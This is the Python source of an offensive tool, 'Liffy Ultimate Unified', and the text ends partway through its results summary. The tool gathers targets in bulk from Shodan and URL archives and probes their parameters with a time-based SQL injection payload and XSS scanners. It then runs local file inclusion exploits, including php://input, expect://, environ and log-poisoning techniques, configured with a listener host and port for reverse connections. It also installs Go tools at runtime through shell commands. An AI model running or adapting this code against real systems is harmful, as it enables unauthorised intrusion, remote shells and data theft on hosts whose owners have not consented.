#!/usr/bin/env python3
"""
Liffy Ultimate Unified - The Complete LFI Exploitation and Vulnerability Testing Tool
Combines all features from liffy.py, liffy_enhanced.py, liffy_ultimate.py, url_gatherer.py, and url_processor.py
"""

__author__ = 'rotlogix'
__author__ = 'unicornFurnace'
__author__ = 'enhanced by kdairatchi'
__version__ = '4.0.0'

import argparse
import sys
import os
import time
import json
import random
import subprocess
import threading
import tempfile
import shutil
from pathlib import Path
from typing import List, Dict, Optional, Any, Tuple
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import urllib.parse
from urllib.parse import urlparse, urljoin, parse_qs, quote_plus
import base64
import requests
from dataclasses import dataclass
from enum import Enum
import datetime
import textwrap
import ip_utils

# Import core Liffy modules
try:
    import core
    from shell_generator import Generator
    from msf import Payload
except ImportError:
    print("Error: Core Liffy modules not found. Please ensure core.py, shell_generator.py, and msf.py are in the same directory.")
    sys.exit(1)

try:
    from blessings import Terminal
    t = Terminal()
except ImportError:
    class Terminal:
        def __getattr__(self, name):
            return lambda x: x
    t = Terminal()

# Enums and Data Classes
class SourceType(Enum):
    SHODAN = "shodan"
    GAUPLUS = "gauplus"
    WAYBACK = "wayback"
    COMMONCRAWL = "commoncrawl"
    OTX = "otx"
    MANUAL = "manual"
    RANDOM = "random"

class Technique(Enum):
    DATA = "data"
    INPUT = "input"
    EXPECT = "expect"
    ENVIRON = "environ"
    ACCESS = "access"
    SSH = "ssh"
    FILTER = "filter"
    ZIP = "zip"
    PHAR = "phar"
    COMPRESS = "compress"
    AUTO = "auto"

class TestMode(Enum):
    LFI = "lfi"
    XSS = "xss"
    SQLI = "sqli"
    ALL = "all"

@dataclass
class URLInfo:
    """Information about a discovered URL"""
    url: str
    source: SourceType
    domain: str
    parameters: Dict[str, List[str]]
    method: str = "GET"
    status_code: Optional[int] = None
    title: Optional[str] = None
    content_type: Optional[str] = None
    response_size: Optional[int] = None
    discovered_at: str = ""
    lfi_vulnerable: bool = False
    xss_vulnerable: bool = False
    sqli_vulnerable: bool = False

@dataclass
class LiffyConfig:
    """Configuration class for Liffy"""
    # Target selection
    target_url: Optional[str] = None
    domain: Optional[str] = None
    shodan_query: Optional[str] = None
    random_targets: bool = False
    random_count: int = 5
    limit: int = 100
    country: Optional[str] = None
    asn: Optional[str] = None
    ports: Optional[str] = None
    
    # Technique selection
    technique: Technique = Technique.AUTO
    test_mode: TestMode = TestMode.ALL
    
    # Payload options
    lhost: Optional[str] = None
    lport: Optional[int] = None
    auto_ip: bool = False
    auto_port: bool = False
    nostager: bool = False
    payload: Optional[str] = None
    
    # Log poisoning options
    location: Optional[str] = None
    relative: bool = False
    
    # Request options
    cookies: Optional[str] = None
    user_agent: Optional[str] = None
    proxy: Optional[str] = None
    timeout: int = 30
    
    # General options
    verbose: bool = False
    output_file: Optional[str] = None
    max_workers: int = 10
    threads: int = 1
    
    # Tools
    use_airixss: bool = True
    use_jeeves: bool = True
    use_sqry: bool = True
    use_gauplus: bool = True
    use_gf: bool = True
    use_qsreplace: bool = True

class LiffyLogger:
    """Enhanced logging system"""
    
    def __init__(self, verbose: bool = False, output_file: Optional[str] = None):
        self.verbose = verbose
        self.logger = logging.getLogger('liffy_ultimate')
        self.logger.setLevel(logging.DEBUG if verbose else logging.INFO)
        
        # Clear existing handlers
        self.logger.handlers.clear()
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.INFO)
        console_format = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        console_handler.setFormatter(console_format)
        self.logger.addHandler(console_handler)
        
        # File handler if specified
        if output_file:
            file_handler = logging.FileHandler(output_file)
            file_handler.setLevel(logging.DEBUG)
            file_format = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            file_handler.setFormatter(file_format)
            self.logger.addHandler(file_handler)
    
    def info(self, message: str):
        self.logger.info(message)
    
    def warning(self, message: str):
        self.logger.warning(message)
    
    def error(self, message: str):
        self.logger.error(message)
    
    def debug(self, message: str):
        self.logger.debug(message)

class LiffyUI:
    """Enhanced UI with better formatting and progress indicators"""
    
    def __init__(self, logger: LiffyLogger):
        self.logger = logger
    
    def banner(self):
        """Enhanced banner with version info"""
        banner_text = f"""{t.cyan("""
    .____    .__  _____  _____
    |    |   |__|/ ____\\/ ____\\__.__.
    |    |   |  \\   __\\   __<   |  |
    |    |___|  ||  |   |  |  \\___  |
    |_______ \\__||__|   |__|  / ____| v{__version__}
        \\/                \\/

    🚀 LFI Exploitation & Vulnerability Testing Tool
    ========================================================
    Author: {__author__}
    Features: URL Gathering | LFI Exploitation | XSS Testing | SQLi Testing
    Python 3 Compatible | Modern Features | Advanced Techniques
""")}"""
        print(banner_text)
    
    def progress_bar(self, duration: float = 2.0, message: str = "Processing"):
        """Enhanced progress bar with message"""
        bar_width = 50
        sys.stdout.write(t.cyan(f"[{datetime.datetime.now()}] {message}: "))
        sys.stdout.write(" " * bar_width)
        sys.stdout.flush()
        sys.stdout.write("\b" * (bar_width + 1))
        
        for i in range(bar_width):
            time.sleep(duration / bar_width)
            sys.stdout.write("█")
            sys.stdout.flush()
        
        sys.stdout.write("\n")
    
    def success(self, message: str):
        """Success message"""
        print(t.green(f"[{datetime.datetime.now()}] ✓ {message}"))
    
    def error(self, message: str):
        """Error message"""
        print(t.red(f"[{datetime.datetime.now()}] ✗ {message}"))
    
    def warning(self, message: str):
        """Warning message"""
        print(t.yellow(f"[{datetime.datetime.now()}] ⚠ {message}"))
    
    def info(self, message: str):
        """Info message"""
        print(t.cyan(f"[{datetime.datetime.now()}] ℹ {message}"))

class LiffyValidator:
    """Input validation and security checks"""
    
    @staticmethod
    def validate_url(url: str) -> bool:
        """Validate target URL"""
        try:
            parsed = urlparse(url)
            return all([parsed.scheme, parsed.netloc])
        except Exception:
            return False
    
    @staticmethod
    def validate_port(port: int) -> bool:
        """Validate port number"""
        return 1 <= port <= 65535
    
    @staticmethod
    def validate_ip(ip: str) -> bool:
        """Validate IP address"""
        try:
            parts = ip.split('.')
            return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
        except Exception:
            return False
    
    @staticmethod
    def validate_auto_detection(config: LiffyConfig) -> Tuple[Optional[str], int]:
        """Validate and auto-detect lhost and lport if needed"""
        lhost = config.lhost
        lport = config.lport
        
        # Auto-detect IP if requested or not provided
        if config.auto_ip or not lhost:
            try:
                detected_lhost, detected_lport = ip_utils.NetworkUtils.auto_detect_lhost_lport(config.target_url or "")
                if detected_lhost:
                    lhost = detected_lhost
            except Exception:
                pass
        
        # Auto-detect port if requested or not provided
        if config.auto_port or not lport:
            try:
                detected_port = ip_utils.PortManager.find_best_port()
                lport = detected_port
            except Exception:
                lport = 4444
        
        # Validate final values
        if not lhost:
            return None, 0
        
        if not lport:
            return None, 0
        
        if not LiffyValidator.validate_ip(lhost):
            return None, 0
        
        if not LiffyValidator.validate_port(lport):
            return None, 0
        
        return lhost, lport

class ToolManager:
    """Manages all external tools"""
    
    def __init__(self, logger: LiffyLogger):
        self.logger = logger
        self.tools = {
            'sqry': 'sqry',
            'gauplus': 'gauplus',
            'airixss': 'airixss',
            'jeeves': 'jeeves',
            'qsreplace': 'qsreplace',
            'gf': 'gf'
        }
        self._ensure_tools_installed()
    
    def _ensure_tools_installed(self):
        """Ensure all required tools are installed"""
        for tool_name, tool_path in self.tools.items():
            if not self._is_tool_available(tool_path):
                self.logger.warning(f"{tool_name} not found, installing...")
                self._install_tool(tool_name)
    
    def _is_tool_available(self, tool_path: str) -> bool:
        """Check if tool is available"""
        try:
            result = subprocess.run([tool_path, '--help'], capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def _install_tool(self, tool_name: str):
        """Install required tool"""
        install_commands = {
            'sqry': 'go install github.com/kdairatchi/sqry@latest',
            'gauplus': 'go install github.com/bp0lr/gauplus@latest',
            'airixss': 'go install github.com/ferreiraklet/airixss@latest',
            'jeeves': 'go install github.com/ferreiraklet/jeeves@latest',
            'qsreplace': 'go install github.com/tomnomnom/qsreplace@latest',
            'gf': 'go install github.com/tomnomnom/gf@latest'
        }
        
        if tool_name in install_commands:
            try:
                subprocess.run(install_commands[tool_name], shell=True, capture_output=True, text=True, timeout=60)
                self.logger.info(f"{tool_name} installed successfully")
            except Exception as e:
                self.logger.error(f"Error installing {tool_name}: {str(e)}")

class URLGatherer:
    """Comprehensive URL gathering with all methods"""
    
    def __init__(self, logger: LiffyLogger, tool_manager: ToolManager):
        self.logger = logger
        self.tool_manager = tool_manager
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def gather_from_shodan(self, query: str, limit: int = 100) -> List[URLInfo]:
        """Gather URLs from Shodan using sqry"""
        urls = []
        
        try:
            cmd = [self.tool_manager.tools['sqry'], "-q", query, "--json",]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        try:
                            data = json.loads(line)
                            if 'ip' in data:
                                ip = data['ip']
                                ports = data.get('ports', [])
                                protocol = 'https' if 443 in ports else 'http'
                                port = 443 if 443 in ports else (80 if 80 in ports else ports[0] if ports else 80)
                                
                                if port not in [80, 443]:
                                    url = f"{protocol}://{ip}:{port}"
                                else:
                                    url = f"{protocol}://{ip}"
                                
                                url_info = URLInfo(
                                    url=url,
                                    source=SourceType.SHODAN,
                                    domain=ip,
                                    parameters={},
                                    discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                                )
                                urls.append(url_info)
                        except json.JSONDecodeError:
                            continue
        except Exception as e:
            self.logger.error(f"Error running Shodan query: {str(e)}")
        
        return urls
    
    def gather_from_gauplus(self, domain: str, subs: bool = True, limit: int = 1000) -> List[URLInfo]:
        """Gather URLs using gauplus"""
        urls = []
        
        try:
            cmd = [self.tool_manager.tools['gauplus'], "-json", "-t", "10", "-providers", "wayback,otx,commoncrawl"]
            if subs:
                cmd.append("-subs")
            cmd.append(domain)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        try:
                            data = json.loads(line)
                            if 'url' in data:
                                url = data['url']
                                parsed = urlparse(url)
                                params = parse_qs(parsed.query)
                                
                                url_info = URLInfo(
                                    url=url,
                                    source=SourceType.GAUPLUS,
                                    domain=parsed.netloc,
                                    parameters=params,
                                    discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                                )
                                urls.append(url_info)
                        except json.JSONDecodeError:
                            continue
        except Exception as e:
            self.logger.error(f"Error running gauplus: {str(e)}")
        
        return urls[:limit]
    
    def gather_random_targets(self, count: int = 5) -> List[URLInfo]:
        """Gather random targets from scope directory"""
        urls = []
        scope_dir = Path.home() / "targets" / "scope"
        
        try:
            if not scope_dir.exists():
                self.logger.error(f"Scope directory not found: {scope_dir}")
                return urls
            
            # Find scope files
            scope_files = []
            for file_path in scope_dir.rglob("*"):
                if (file_path.is_file() and 
                    file_path.suffix in ['.txt', '.md', '.json', '.csv']):
                    scope_files.append(file_path)
            
            if not scope_files:
                self.logger.error("No scope files found")
                return urls
            
            # Read all targets
            all_targets = set()
            for scope_file in scope_files:
                try:
                    with open(scope_file, 'r', encoding='utf-8') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                if '://' in line:
                                    all_targets.add(line)
                                elif '.' in line and not line.startswith('*'):
                                    all_targets.add(f"http://{line}")
                                    all_targets.add(f"https://{line}")
                except Exception as e:
                    self.logger.debug(f"Error reading {scope_file}: {str(e)}")
            
            # Select random targets
            targets_list = list(all_targets)
            random.shuffle(targets_list)
            selected_targets = targets_list[:min(count, len(targets_list))]
            
            for target in selected_targets:
                try:
                    parsed = urlparse(target)
                    if parsed.netloc:
                        url_info = URLInfo(
                            url=target,
                            source=SourceType.RANDOM,
                            domain=parsed.netloc,
                            parameters={},
                            discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                        )
                        urls.append(url_info)
                except Exception as e:
                    self.logger.debug(f"Error parsing target {target}: {str(e)}")
        
        except Exception as e:
            self.logger.error(f"Error gathering random targets: {str(e)}")
        
        return urls
    
    def analyze_url(self, url_info: URLInfo) -> URLInfo:
        """Analyze URL for potential vulnerabilities"""
        try:
            response = self.session.get(url_info.url, timeout=10, allow_redirects=True)
            url_info.status_code = response.status_code
            url_info.content_type = response.headers.get('content-type', '')
            url_info.response_size = len(response.content)
            
            # Extract title
            title_match = re.search(r'<title[^>]*>(.*?)</title>', response.text, re.IGNORECASE)
            if title_match:
                url_info.title = title_match.group(1).strip()
            
            # Check for LFI parameters
            url_info.lfi_vulnerable = self._check_lfi_parameters(url_info.parameters)
            
            # Check for XSS parameters
            url_info.xss_vulnerable = self._check_xss_parameters(url_info.parameters)
            
            # Check for SQLi parameters
            url_info.sqli_vulnerable = self._check_sqli_parameters(url_info.parameters)
            
            # If no parameters, add common test parameters
            if not url_info.parameters:
                url_info.parameters = self._get_common_test_parameters()
                url_info.lfi_vulnerable = self._check_lfi_parameters(url_info.parameters)
                url_info.xss_vulnerable = self._check_xss_parameters(url_info.parameters)
                url_info.sqli_vulnerable = self._check_sqli_parameters(url_info.parameters)
        
        except Exception as e:
            self.logger.debug(f"Error analyzing URL {url_info.url}: {str(e)}")
        
        return url_info
    
    def _check_lfi_parameters(self, parameters: Dict[str, List[str]]) -> bool:
        """Check if parameters might be vulnerable to LFI"""
        lfi_keywords = [
            'file', 'page', 'path', 'include', 'require', 'view', 'template',
            'doc', 'document', 'folder', 'dir', 'directory', 'read', 'load',
            'show', 'display', 'content', 'data', 'src', 'source'
        ]
        
        for param_name in parameters.keys():
            if any(keyword in param_name.lower() for keyword in lfi_keywords):
                return True
        
        return False
    
    def _check_xss_parameters(self, parameters: Dict[str, List[str]]) -> bool:
        """Check if parameters might be vulnerable to XSS"""
        xss_keywords = [
            'search', 'query', 'q', 'term', 'keyword', 'name', 'title',
            'description', 'comment', 'message', 'text', 'input', 'value'
        ]
        
        for param_name in parameters.keys():
            if any(keyword in param_name.lower() for keyword in xss_keywords):
                return True
        
        return False
    
    def _check_sqli_parameters(self, parameters: Dict[str, List[str]]) -> bool:
        """Check if parameters might be vulnerable to SQLi"""
        sqli_keywords = [
            'id', 'user', 'username', 'password', 'email', 'search', 'query',
            'category', 'type', 'status', 'order', 'sort', 'filter'
        ]
        
        for param_name in parameters.keys():
            if any(keyword in param_name.lower() for keyword in sqli_keywords):
                return True
        
        return False
    
    def _get_common_test_parameters(self) -> Dict[str, List[str]]:
        """Get common test parameters for vulnerability detection"""
        return {
            'file': ['test.txt'],
            'page': ['index.php'],
            'path': ['/etc/passwd'],
            'include': ['config.php'],
            'view': ['home.html'],
            'search': ['alert'],
            'query': ['example'],
            'id': ['1'],
            'user': ['admin']
        }
    
    def test_xss(self, url_info: URLInfo) -> bool:
        """Test URL for XSS vulnerabilities"""
        if not url_info.xss_vulnerable:
            return False
        
        try:
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                f.write(url_info.url)
                temp_file = f.name
            
            cmd = [self.tool_manager.tools['airixss'], "-l", temp_file, "-o", f"/tmp/xss_results_{int(time.time())}.txt"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            os.unlink(temp_file)
            return result.returncode == 0
        except Exception as e:
            self.logger.error(f"Error testing XSS: {str(e)}")
            return False
    
    def test_sqli(self, url_info: URLInfo) -> bool:
        """Test URL for SQL injection vulnerabilities"""
        if not url_info.sqli_vulnerable:
            return False
        
        try:
            test_urls = []
            for param_name, param_values in url_info.parameters.items():
                if param_values:
                    payload = f"(select(0)from(select(sleep(5)))v)"
                    test_url = url_info.url.replace(f"{param_name}={param_values[0]}", f"{param_name}={payload}")
                    test_urls.append(test_url)
            
            for test_url in test_urls:
                start_time = time.time()
                try:
                    response = requests.get(test_url, timeout=10)
                    end_time = time.time()
                    
                    if end_time - start_time >= 4:
                        return True
                except requests.Timeout:
                    return True
        except Exception as e:
            self.logger.error(f"Error testing SQLi: {str(e)}")
        
        return False
    
    def gather_all_urls(self, config: LiffyConfig) -> List[URLInfo]:
        """Gather URLs from all sources"""
        all_urls = []
        
        # Random targets gathering
        if config.random_targets or (not config.domain and not config.shodan_query):
            self.logger.info("Gathering random targets from scope...")
            random_urls = self.gather_random_targets(config.random_count)
            all_urls.extend(random_urls)
            self.logger.info(f"Found {len(random_urls)} random targets")
        
        # Shodan gathering
        if config.shodan_query:
            self.logger.info("Gathering URLs from Shodan...")
            shodan_urls = self.gather_from_shodan(config.shodan_query, config.limit)
            all_urls.extend(shodan_urls)
            self.logger.info(f"Found {len(shodan_urls)} URLs from Shodan")
        
        # Gauplus gathering
        if config.domain:
            self.logger.info("Gathering URLs from historical sources...")
            gauplus_urls = self.gather_from_gauplus(config.domain, limit=config.limit)
            all_urls.extend(gauplus_urls)
            self.logger.info(f"Found {len(gauplus_urls)} URLs from historical sources")
        
        # Remove duplicates
        unique_urls = self._remove_duplicates(all_urls)
        self.logger.info(f"Total unique URLs: {len(unique_urls)}")
        
        return unique_urls
    
    def analyze_urls(self, urls: List[URLInfo], max_workers: int = 10) -> List[URLInfo]:
        """Analyze URLs for vulnerabilities"""
        self.logger.info(f"Analyzing {len(urls)} URLs...")
        
        analyzed_urls = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_url = {
                executor.submit(self.analyze_url, url): url 
                for url in urls
            }
            
            for future in as_completed(future_to_url):
                try:
                    analyzed_url = future.result()
                    analyzed_urls.append(analyzed_url)
                except Exception as e:
                    self.logger.error(f"Error analyzing URL: {str(e)}")
        
        return analyzed_urls
    
    def test_vulnerabilities(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Test URLs for specific vulnerabilities"""
        self.logger.info("Testing for vulnerabilities...")
        
        for url_info in urls:
            if url_info.xss_vulnerable:
                self.logger.info(f"Testing XSS for: {url_info.url}")
                url_info.xss_vulnerable = self.test_xss(url_info)
            
            if url_info.sqli_vulnerable:
                self.logger.info(f"Testing SQLi for: {url_info.url}")
                url_info.sqli_vulnerable = self.test_sqli(url_info)
        
        return urls
    
    def _remove_duplicates(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Remove duplicate URLs"""
        seen = set()
        unique_urls = []
        
        for url_info in urls:
            if url_info.url not in seen:
                seen.add(url_info.url)
                unique_urls.append(url_info)
        
        return unique_urls
    
    def save_results(self, urls: List[URLInfo], output_file: str = None):
        """Save results to file"""
        if not output_file:
            output_file = f"liffy_ultimate_results_{int(time.time())}.json"
        
        results = []
        for url_info in urls:
            results.append({
                'url': url_info.url,
                'source': url_info.source.value,
                'domain': url_info.domain,
                'parameters': url_info.parameters,
                'status_code': url_info.status_code,
                'title': url_info.title,
                'lfi_vulnerable': url_info.lfi_vulnerable,
                'xss_vulnerable': url_info.xss_vulnerable,
                'sqli_vulnerable': url_info.sqli_vulnerable,
                'discovered_at': url_info.discovered_at
            })
        
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        self.logger.info(f"Results saved to: {output_file}")

class LiffyExploiter:
    """LFI exploitation using original core techniques"""
    
    def __init__(self, config: LiffyConfig, logger: LiffyLogger, ui: LiffyUI):
        self.config = config
        self.logger = logger
        self.ui = ui
        self.session = requests.Session()
        
        if config.user_agent:
            self.session.headers.update({'User-Agent': config.user_agent})
        if config.proxy:
            self.session.proxies.update({'http': config.proxy, 'https': config.proxy})
        
        self.session.timeout = config.timeout
    
    def check_target(self) -> bool:
        """Check if target is accessible"""
        self.ui.info(f"Checking target: {self.config.target_url}")
        
        try:
            parsed = urlparse(self.config.target_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            
            response = self.session.get(domain, timeout=self.config.timeout)
            if response.status_code == 200:
                self.ui.success("Target is accessible")
                return True
            else:
                self.ui.warning(f"Target returned status code: {response.status_code}")
                return False
        except requests.RequestException as e:
            self.ui.error(f"Failed to connect to target: {str(e)}")
            return False
    
    def execute_technique(self):
        """Execute the selected LFI technique"""
        technique_map = {
            Technique.DATA: self._execute_data,
            Technique.INPUT: self._execute_input,
            Technique.EXPECT: self._execute_expect,
            Technique.ENVIRON: self._execute_environ,
            Technique.ACCESS: self._execute_access,
            Technique.SSH: self._execute_ssh,
            Technique.FILTER: self._execute_filter,
            Technique.ZIP: self._execute_zip,
            Technique.PHAR: self._execute_phar,
            Technique.COMPRESS: self._execute_compress,
            Technique.AUTO: self._execute_auto
        }
        
        if self.config.technique in technique_map:
            self.ui.info(f"Executing {self.config.technique.value} technique")
            technique_map[self.config.technique]()
        else:
            self.ui.error("Invalid technique selected")
            sys.exit(1)
    
    def _execute_data(self):
        """Execute data:// technique using original core"""
        try:
            d = core.Data(self.config.target_url, self.config.nostager, self.config.cookies)
            d.execute_data()
        except Exception as e:
            self.ui.error(f"Error executing data technique: {str(e)}")
    
    def _execute_input(self):
        """Execute php://input technique using original core"""
        try:
            i = core.Input(self.config.target_url, self.config.nostager, self.config.cookies)
            i.execute_input()
        except Exception as e:
            self.ui.error(f"Error executing input technique: {str(e)}")
    
    def _execute_expect(self):
        """Execute expect:// technique using original core"""
        try:
            e = core.Expect(self.config.target_url, self.config.nostager, self.config.cookies)
            e.execute_expect()
        except Exception as e:
            self.ui.error(f"Error executing expect technique: {str(e)}")
    
    def _execute_environ(self):
        """Execute /proc/self/environ technique using original core"""
        try:
            e = core.Environ(self.config.target_url, self.config.nostager, self.config.relative, self.config.cookies)
            e.execute_environ()
        except Exception as e:
            self.ui.error(f"Error executing environ technique: {str(e)}")
    
    def _execute_access(self):
        """Execute access log poisoning using original core"""
        try:
            location = self.config.location or '/var/log/apache2/access.log'
            a = core.Logs(self.config.target_url, location, self.config.nostager, self.config.relative, self.config.cookies)
            a.execute_logs()
        except Exception as e:
            self.ui.error(f"Error executing access technique: {str(e)}")
    
    def _execute_ssh(self):
        """Execute SSH log poisoning using original core"""
        try:
            location = self.config.location or '/var/log/auth.log'
            a = core.SSHLogs(self.config.target_url, location, self.config.relative, self.config.cookies)
            a.execute_ssh()
        except Exception as e:
            self.ui.error(f"Error executing SSH technique: {str(e)}")
    
    def _execute_filter(self):
        """Execute php://filter technique using original core"""
        try:
            f = core.Filter(self.config.target_url, self.config.cookies)
            f.execute_filter()
        except Exception as e:
            self.ui.error(f"Error executing filter technique: {str(e)}")
    
    def _execute_zip(self):
        """Execute zip:// technique (placeholder for new technique)"""
        self.ui.warning("zip:// technique not yet implemented in core")
    
    def _execute_phar(self):
        """Execute phar:// technique (placeholder for new technique)"""
        self.ui.warning("phar:// technique not yet implemented in core")
    
    def _execute_compress(self):
        """Execute compress.zlib:// technique (placeholder for new technique)"""
        self.ui.warning("compress.zlib:// technique not yet implemented in core")
    
    def _execute_auto(self):
        """Execute automatic technique detection"""
        self.ui.info("Auto-detecting best technique...")
        # Try techniques in order of likelihood
        techniques = [Technique.DATA, Technique.INPUT, Technique.FILTER, Technique.ENVIRON]
        
        for technique in techniques:
            self.config.technique = technique
            self.ui.info(f"Trying {technique.value} technique...")
            try:
                self.execute_technique()
                return
            except Exception as e:
                self.ui.warning(f"{technique.value} technique failed: {str(e)}")
                continue
        
        self.ui.error("All techniques failed")

class LiffyUltimateUnified:
    """Main unified Liffy tool"""
    
    def __init__(self, config: LiffyConfig):
        self.config = config
        self.logger = LiffyLogger(config.verbose, config.output_file)
        self.ui = LiffyUI(self.logger)
        self.tool_manager = ToolManager(self.logger)
        self.url_gatherer = URLGatherer(self.logger, self.tool_manager)
        self.results = []
    
    def run(self):
        """Main execution method"""
        self.ui.banner()
        
        # If specific URL provided, run single target mode
        if self.config.target_url:
            self._run_single_target_mode()
        else:
            self._run_multi_target_mode()
    
    def _run_single_target_mode(self):
        """Run single target LFI exploitation"""
        self.ui.info("Running single target mode")
        
        # Validate target
        if not LiffyValidator.validate_url(self.config.target_url):
            self.ui.error("Invalid target URL provided")
            return
        
        # Auto-detect lhost and lport if needed
        lhost, lport = LiffyValidator.validate_auto_detection(self.config)
        if not lhost or not lport:
            self.ui.error("Could not determine lhost/lport")
            return
        
        self.config.lhost = lhost
        self.config.lport = lport
        
        # Create exploiter and execute
        exploiter = LiffyExploiter(self.config, self.logger, self.ui)
        
        if exploiter.check_target():
            exploiter.execute_technique()
        else:
            self.ui.error("Target validation failed")
    
    def _run_multi_target_mode(self):
        """Run multi-target vulnerability testing"""
        self.ui.info("Running multi-target mode")
        
        # Gather targets
        urls = self.url_gatherer.gather_all_urls(self.config)
        if not urls:
            self.ui.error("No targets found")
            return
        
        # Analyze targets
        analyzed_urls = self.url_gatherer.analyze_urls(urls, self.config.max_workers)
        
        # Test vulnerabilities based on mode
        if self.config.test_mode == TestMode.LFI:
            tested_urls = self._test_lfi_vulnerabilities(analyzed_urls)
        elif self.config.test_mode == TestMode.XSS:
            tested_urls = self._test_xss_vulnerabilities(analyzed_urls)
        elif self.config.test_mode == TestMode.SQLI:
            tested_urls = self._test_sqli_vulnerabilities(analyzed_urls)
        else:  # ALL
            tested_urls = self._test_lfi_vulnerabilities(analyzed_urls)
            tested_urls = self._test_xss_vulnerabilities(tested_urls)
            tested_urls = self._test_sqli_vulnerabilities(tested_urls)
        
        # Save results
        if self.config.output_file:
            self.url_gatherer.save_results(tested_urls, self.config.output_file)
        
        # Show summary
        self._show_summary(tested_urls)
        
        # Offer to exploit LFI targets
        lfi_targets = [u for u in tested_urls if u.lfi_vulnerable]
        if lfi_targets and self.config.test_mode in [TestMode.LFI, TestMode.ALL]:
            self._offer_lfi_exploitation(lfi_targets)
    
    def _test_lfi_vulnerabilities(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Test for LFI vulnerabilities"""
        lfi_targets = [u for u in urls if u.lfi_vulnerable]
        if not lfi_targets:
            self.ui.warning("No LFI targets found")
            return urls
        
        self.ui.info(f"Testing {len(lfi_targets)} targets for LFI vulnerabilities...")
        
        for url_info in lfi_targets:
            try:
                # Create config for this target
                target_config = LiffyConfig(
                    target_url=url_info.url,
                    technique=self.config.technique,
                    lhost=self.config.lhost,
                    lport=self.config.lport,
                    auto_ip=self.config.auto_ip,
                    auto_port=self.config.auto_port,
                    nostager=self.config.nostager,
                    cookies=self.config.cookies,
                    location=self.config.location,
                    relative=self.config.relative,
                    verbose=self.config.verbose,
                    timeout=self.config.timeout
                )
                
                # Validate and auto-detect if needed
                lhost, lport = LiffyValidator.validate_auto_detection(target_config)
                if lhost and lport:
                    target_config.lhost = lhost
                    target_config.lport = lport
                    
                    # Test target
                    exploiter = LiffyExploiter(target_config, self.logger, self.ui)
                    if exploiter.check_target():
                        self.ui.success(f"LFI target confirmed: {url_info.url}")
                        url_info.lfi_vulnerable = True
                    else:
                        self.ui.warning(f"LFI target not accessible: {url_info.url}")
                        url_info.lfi_vulnerable = False
                else:
                    self.ui.error(f"Could not determine lhost/lport for: {url_info.url}")
                    url_info.lfi_vulnerable = False
                    
            except Exception as e:
                self.ui.error(f"Error testing LFI for {url_info.url}: {str(e)}")
                url_info.lfi_vulnerable = False
        
        return urls
    
    def _test_xss_vulnerabilities(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Test for XSS vulnerabilities"""
        xss_targets = [u for u in urls if u.xss_vulnerable]
        if not xss_targets:
            self.ui.warning("No XSS targets found")
            return urls
        
        self.ui.info(f"Testing {len(xss_targets)} targets for XSS vulnerabilities...")
        
        for url_info in xss_targets:
            try:
                result = self.url_gatherer.test_xss(url_info)
                if result:
                    self.ui.success(f"XSS vulnerability found: {url_info.url}")
                    url_info.xss_vulnerable = True
                else:
                    self.ui.warning(f"No XSS vulnerability: {url_info.url}")
                    url_info.xss_vulnerable = False
            except Exception as e:
                self.ui.error(f"Error testing XSS for {url_info.url}: {str(e)}")
                url_info.xss_vulnerable = False
        
        return urls
    
    def _test_sqli_vulnerabilities(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Test for SQL injection vulnerabilities"""
        sqli_targets = [u for u in urls if u.sqli_vulnerable]
        if not sqli_targets:
            self.ui.warning("No SQLi targets found")
            return urls
        
        self.ui.info(f"Testing {len(sqli_targets)} targets for SQL injection vulnerabilities...")
        
        for url_info in sqli_targets:
            try:
                result = self.url_gatherer.test_sqli(url_info)
                if result:
                    self.ui.success(f"SQL injection vulnerability found: {url_info.url}")
                    url_info.sqli_vulnerable = True
                else:
                    self.ui.warning(f"No SQL injection vulnerability: {url_info.url}")
                    url_info.sqli_vulnerable = False
            except Exception as e:
                self.ui.error(f"Error testing SQLi for {url_info.url}: {str(e)}")
                url_info.sqli_vulnerable = False
        
        return urls
    
    def _show_summary(self, urls: List[URLInfo]):
        """Show final summary of results"""
        lfi_vulns = [u for u in urls if u.lfi_vulnerable]
        xss_vulns = [u for u in urls if u.xss_vulnerable]
        sqli_vulns = [u for u in urls if u.sqli_vulnerable]
        
        self.ui.info("\n" + "="*60)
        self.ui.info("FINAL SUMMARY")
        self.ui.info("="*60)
        self.ui.info(f"Total targets tested: {len(urls)}")
        self.ui.info(f"LFI vulnerabilities: {len(lfi_vulns)}")
        self.ui.info(f"XSS vulnerabilities: {len(xss_vulns)}")
        self.ui.info(f"SQLi vulnerabilities: {len(sqli_vulns)}")
        
        if lfi_vulns:
            self.ui.info(f"\n{t.yellow('LFI Vulnerabilities:')}")
            for vuln in lfi_vulns[:5]:  # Show first 5
                self.ui.info(f"  {vuln.url}")
        
        if xss_vulns:
            self.ui.info(f"\n{t.yellow('XSS Vulnerabilities:')}")
            for vuln in xss_vulns[:5]:  # Show first 5
                self.ui.info(f"  {vuln.url}")
        
        if sqli_vulns:
            self.ui.info(f"\n{t.yellow('SQLi Vulnerabilities:')}")
